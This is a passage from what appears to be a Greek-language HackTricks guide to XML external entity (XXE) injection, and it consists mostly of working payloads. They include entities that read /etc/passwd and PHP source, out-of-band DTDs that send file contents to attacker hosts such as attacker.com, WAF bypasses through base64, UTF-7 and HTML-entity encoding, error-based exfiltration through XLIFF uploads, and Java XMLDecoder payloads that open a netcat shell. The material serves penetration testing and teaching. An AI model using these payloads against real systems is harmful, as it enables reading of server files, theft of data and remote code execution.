Για να αλλάξετε το αίτημα μπορείτε να χρησιμοποιήσετε μια επέκταση του Burp με το όνομα "**Content Type Converter**". [Εδώ](https://exploitstube.com/xxe-for-fun-and-profit-converting-json-request-to-xml.html) μπορείτε να βρείτε αυτό το παράδειγμα:
```xml
Content-Type: application/json;charset=UTF-8

{"root": {"root": {
"firstName": "Avinash",
"lastName": "",
"country": "United States",
"city": "ddd",
"postalCode": "ddd"
}}}
```

```xml
Content-Type: application/xml;charset=UTF-8

<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!DOCTYPE testingxxe [<!ENTITY xxe SYSTEM "http://34.229.92.127:8000/TEST.ext" >]>
<root>
<root>
<firstName>&xxe;</firstName>
<lastName/>
<country>United States</country>
<city>ddd</city>
<postalCode>ddd</postalCode>
</root>
</root>
```
Μια άλλη παράδειγμα μπορεί να βρεθεί [εδώ](https://medium.com/hmif-itb/googlectf-2019-web-bnv-writeup-nicholas-rianto-putra-medium-b8e2d86d78b2).

## WAF & Παρακάμψεις Προστασιών

### Base64
```xml
<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>
```
Αυτό λειτουργεί μόνο εάν ο XML διακομιστής δέχεται το πρωτόκολλο `data://`.

### UTF-7

Μπορείτε να χρησιμοποιήσετε το \[**"Συνταγή Κωδικοποίησης**" του cyberchef εδώ ]\([https://gchq.github.io/CyberChef/#recipe=Encode\_text%28'UTF-7](https://gchq.github.io/CyberChef/#recipe=Encode\_text%28'UTF-7) %2865000%29'%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4)to]\([https://gchq.github.io/CyberChef/#recipe=Encode\_text%28'UTF-7 %2865000%29'%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4%29to](https://gchq.github.io/CyberChef/#recipe=Encode\_text%28%27UTF-7%20%2865000%29%27%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4%29to)) μετατροπή σε UTF-7.
```xml
<!xml version="1.0" encoding="UTF-7"?-->
+ADw-+ACE-DOCTYPE+ACA-foo+ACA-+AFs-+ADw-+ACE-ENTITY+ACA-example+ACA-SYSTEM+ACA-+ACI-/etc/passwd+ACI-+AD4-+ACA-+AF0-+AD4-+AAo-+ADw-stockCheck+AD4-+ADw-productId+AD4-+ACY-example+ADs-+ADw-/productId+AD4-+ADw-storeId+AD4-1+ADw-/storeId+AD4-+ADw-/stockCheck+AD4-
```

```xml
<?xml version="1.0" encoding="UTF-7"?>
+ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ELEMENT foo ANY +AD4
+ADwAIQ-ENTITY xxe SYSTEM +ACI-http://hack-r.be:1337+ACI +AD4AXQA+
+ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4
```
### Αναβολή πρωτοκόλλου αρχείου:

Εάν η ιστοσελίδα χρησιμοποιεί PHP, αντί να χρησιμοποιείτε `file:/`, μπορείτε να χρησιμοποιήσετε **τυλίκες php** `php://filter/convert.base64-encode/resource=` για να **έχετε πρόσβαση σε εσωτερικά αρχεία**.

Εάν η ιστοσελίδα χρησιμοποιεί Java, μπορείτε να ελέγξετε το [**πρωτόκολλο jar**](xxe-xee-xml-external-entity.md#jar-protocol).

### Οντότητες HTML:

Κόλπος από [**https://github.com/Ambrotd/XXE-Notes**](https://github.com/Ambrotd/XXE-Notes)\
Μπορείτε να δημιουργήσετε μια **οντότητα μέσα σε μια οντότητα** κωδικοποιώντας τη με **οντότητες html** και στη συνέχεια να την καλέσετε για να **φορτώσετε ένα dtd**.\
Σημειώστε ότι οι **Οντότητες HTML** που χρησιμοποιούνται πρέπει να είναι **αριθμητικές** (όπως \[σε αυτό το παράδειγμα]\([https://gchq.github.io/CyberChef/#recipe=To\_HTML\_Entity%28true,'Numeric entities'%29\&input=PCFFTlRJVFkgJSBkdGQgU1lTVEVNICJodHRwOi8vMTcyLjE3LjAuMTo3ODc4L2J5cGFzczIuZHRkIiA%2B)\\](https://gchq.github.io/CyberChef/#recipe=To\_HTML\_Entity%28true,%27Numeric%20entities%27%29\&input=PCFFTlRJVFkgJSBkdGQgU1lTVEVNICJodHRwOi8vMTcyLjE3LjAuMTo3ODc4L2J5cGFzczIuZHRkIiA%2B\)%5C)).
```xml
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % a "&#x3C;&#x21;&#x45;&#x4E;&#x54;&#x49;&#x54;&#x59;&#x25;&#x64;&#x74;&#x64;&#x53;&#x59;&#x53;&#x54;&#x45;&#x4D;&#x22;&#x68;&#x74;&#x74;&#x70;&#x3A;&#x2F;&#x2F;&#x6F;&#x75;&#x72;&#x73;&#x65;&#x72;&#x76;&#x65;&#x72;&#x2E;&#x63;&#x6F;&#x6D;&#x2F;&#x62;&#x79;&#x70;&#x61;&#x73;&#x73;&#x2E;&#x64;&#x74;&#x64;&#x22;&#x3E;" >%a;%dtd;]>
<data>
<env>&exfil;</env>
</data>
```
Παράδειγμα DTD:
```xml
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/flag">
<!ENTITY % abt "<!ENTITY exfil SYSTEM 'http://172.17.0.1:7878/bypass.xml?%data;'>">
%abt;
%exfil;
```
## PHP Wrappers

### Base64

**Εξαγωγή** _**index.php**_
```xml
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
```
#### **Εξαγωγή εξωτερικού πόρου**
```xml
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=http://10.0.0.3"> ]>
```
### Απομακρυσμένη εκτέλεση κώδικα

**Εάν το PHP "expect" module είναι φορτωμένο**
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "expect://id" >]>
<creds>
<user>&xxe;</user>
<pass>mypass</pass>
</creds>
```
## **SOAP - XEE**
```xml
<soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"> %dtd;]><xxx/>]]></foo></soap:Body>
```
## XLIFF - XXE

Αυτό το παράδειγμα είναι εμπνευσμένο από [https://pwn.vg/articles/2021-06/local-file-read-via-error-based-xxe](https://pwn.vg/articles/2021-06/local-file-read-via-error-based-xxe)

Το XLIFF (XML Localization Interchange File Format) χρησιμοποιείται για την τυποποίηση της ανταλλαγής δεδομένων στις διαδικασίες τοπικοποίησης. Είναι ένας μορφότυπος βασισμένος σε XML που χρησιμοποιείται κυρίως για τη μεταφορά δεδομένων που μπορούν να τοπικοποιηθούν μεταξύ εργαλείων κατά τη διαδικασία τοπικοποίησης και ως ένα κοινό μορφότυπο ανταλλαγής για εργαλεία CAT (Computer-Aided Translation).

### Ανάλυση Τυφλού Αιτήματος

Γίνεται μια αίτηση στον διακομιστή με τον ακόλουθο περιεχόμενο:
```xml
------WebKitFormBoundaryqBdAsEtYaBjTArl3
Content-Disposition: form-data; name="file"; filename="xxe.xliff"
Content-Type: application/x-xliff+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE XXE [
<!ENTITY % remote SYSTEM "http://redacted.burpcollaborator.net/?xxe_test"> %remote; ]>
<xliff srcLang="en" trgLang="ms-MY" version="2.0"></xliff>
------WebKitFormBoundaryqBdAsEtYaBjTArl3--
```
Ωστόσο, αυτό το αίτημα ενεργοποιεί ένα εσωτερικό σφάλμα διακομιστή, αναφέροντας συγκεκριμένα ένα πρόβλημα με τις δηλώσεις σήμανσης:
```json
{"status":500,"error":"Internal Server Error","message":"Error systemId: http://redacted.burpcollaborator.net/?xxe_test; The markup declarations contained or pointed to by the document type declaration must be well-formed."}
```
Παρά το σφάλμα, καταγράφεται ένα χτύπημα στο Burp Collaborator, υποδηλώνοντας κάποιο επίπεδο αλληλεπίδρασης με το εξωτερικό στοιχείο.

Εξαγωγή Δεδομένων Out of Band Για να εξαγάγετε δεδομένα, στέλνεται ένα τροποποιημένο αίτημα:
```
------WebKitFormBoundaryqBdAsEtYaBjTArl3
Content-Disposition: form-data; name="file"; filename="xxe.xliff"
Content-Type: application/x-xliff+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE XXE [
<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd"> %remote; ]>
<xliff srcLang="en" trgLang="ms-MY" version="2.0"></xliff>
------WebKitFormBoundaryqBdAsEtYaBjTArl3--
```
Αυτή η προσέγγιση αποκαλύπτει ότι ο User Agent υποδεικνύει τη χρήση του Java 1.8. Ένα περιορισμένο σημείο με αυτήν την έκδοση του Java είναι η αδυναμία ανάκτησης αρχείων που περιέχουν χαρακτήρα νέας γραμμής, όπως το /etc/passwd, χρησιμοποιώντας την τεχνική Out of Band.

Εξαγωγή Δεδομένων Με Βάση Σφάλματα Για να ξεπεραστεί αυτός ο περιορισμός, χρησιμοποιείται μια προσέγγιση βασισμένη σε σφάλματα. Το αρχείο DTD έχει την ακόλουθη δομή για να προκαλέσει ένα σφάλμα που περιλαμβάνει δεδομένα από ένα στοχευμένο αρχείο:
```xml
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % foo "<!ENTITY &#37; xxe SYSTEM 'file:///nofile/'>">
%foo;
%xxe;
```
Ο διακομιστής απαντά με ένα σφάλμα, υποδεικνύοντας σημαντικά το μη υπαρκτό αρχείο, υποδεικνύοντας ότι ο διακομιστής προσπαθεί να έχει πρόσβαση στο συγκεκριμένο αρχείο:
```javascript
{"status":500,"error":"Internal Server Error","message":"IO error.\nReason: /nofile (No such file or directory)"}
```
Για να συμπεριληφθεί το περιεχόμενο του αρχείου στο μήνυμα σφάλματος, προσαρμόζεται το αρχείο DTD:
```xml
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % foo "<!ENTITY &#37; xxe SYSTEM 'file:///nofile/%data;'>">
%foo;
%xxe;
```
Αυτή η τροποποίηση οδηγεί στην επιτυχή εξαγωγή του περιεχομένου του αρχείου, όπως αντανακλάται στην έξοδο σφάλματος που στέλνεται μέσω HTTP. Αυτό υποδηλώνει μια επιτυχημένη επίθεση XXE (XML External Entity), εκμεταλλευόμενη τεχνικές Out of Band και Error-Based για την εξαγωγή ευαίσθητων πληροφοριών.

## RSS - XEE

Έγκυρο XML με μορφή RSS για εκμετάλλευση ευπαθειών XXE.

### Ping back

Απλό αίτημα HTTP προς τον διακομιστή των επιτιθέμενων
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "http://<AttackIP>/rssXXE" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>XXE Test Blog</title>
<link>http://example.com/</link>
<description>XXE Test Blog</description>
<lastBuildDate>Mon, 02 Feb 2015 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>Test Post</description>
<author>author@example.com</author>
<pubDate>Mon, 02 Feb 2015 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
### Διάβασμα αρχείου
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>The Blog</title>
<link>http://example.com/</link>
<description>A blog about things</description>
<lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>a post</description>
<author>author@example.com</author>
<pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
### Διαβάστε τον πηγαίο κώδικα

Χρησιμοποιώντας το PHP φίλτρο base64
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=file:///challenge/web-serveur/ch29/index.php" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>The Blog</title>
<link>http://example.com/</link>
<description>A blog about things</description>
<lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>a post</description>
<author>author@example.com</author>
<pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
## Εκμετάλλευση του Java XMLDecoder XEE για RCE

Το XMLDecoder είναι μια κλάση Java που δημιουργεί αντικείμενα με βάση ένα μήνυμα XML. Αν ένας κακόβουλος χρήστης μπορεί να πείσει μια εφαρμογή να χρησιμοποιήσει αυθαίρετα δεδομένα σε ένα κάλεσμα στη μέθοδο **readObject**, τότε θα αποκτήσει αμέσως εκτέλεση κώδικα στον διακομιστή.

### Χρήση της Runtime().exec()
```xml
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.7.0_21" class="java.beans.XMLDecoder">
<object class="java.lang.Runtime" method="getRuntime">
<void method="exec">
<array class="java.lang.String" length="6">
<void index="0">
<string>/usr/bin/nc</string>
</void>
<void index="1">
<string>-l</string>
</void>
<void index="2">
<string>-p</string>
</void>
<void index="3">
<string>9999</string>
</void>
<void index="4">
<string>-e</string>
</void>
<void index="5">
<string>/bin/sh</string>
</void>
</array>
</void>
</object>
</java>
```
### ProcessBuilder

### ΟδηγόςΔιεργασίας
```xml
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.7.0_21" class="java.beans.XMLDecoder">
<void class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="6">
<void index="0">
<string>/usr/bin/nc</string>
</void>
<void index="1">
<string>-l</string>
</void>
<void index="2">
<string>-p</string>
</void>
<void index="3">
<string>9999</string>
</void>
<void index="4">
<string>-e</string>
</void>
<void index="5">
<string>/bin/sh</string>
</void>
</array>
<void method="start" id="process">
</void>
</void>
</java>
```
## Εργαλεία

{% embed url="https://github.com/luisfontes19/xxexploiter" %}

## Αναφορές

* [https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf](https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf)\\
* [https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html](https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html)\\
* Εξαγωγή πληροφοριών μέσω HTTP χρησιμοποιώντας το δικό μας εξωτερικό DTD: [https://ysx.me.uk/from-rss-to-xxe-feed-parsing-on-hootsuite/](https://ysx.me.uk/from-rss-to-xxe-feed-parsing-on-hootsuite/)\\
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection)\\
* [https://gist.github.com/staaldraad/01415b990939494879b4](https://gist.github.com/staaldraad/01415b990939494879b4)\\
* [https://medium.com/@onehackman/exploiting-xml-external-entity-xxe-injections-b0e3eac388f9](https://medium.com/@onehackman/exploiting-xml-external-entity-xxe-injections-b0e3eac388f9)\\
* [https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe)\\
* [https://gosecure.github.io/xxe-workshop/#7](https://gosecure.github.io/xxe-workshop/#7)

<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα τηλεγραφή**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε τα χάκινγκ τρικ σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>
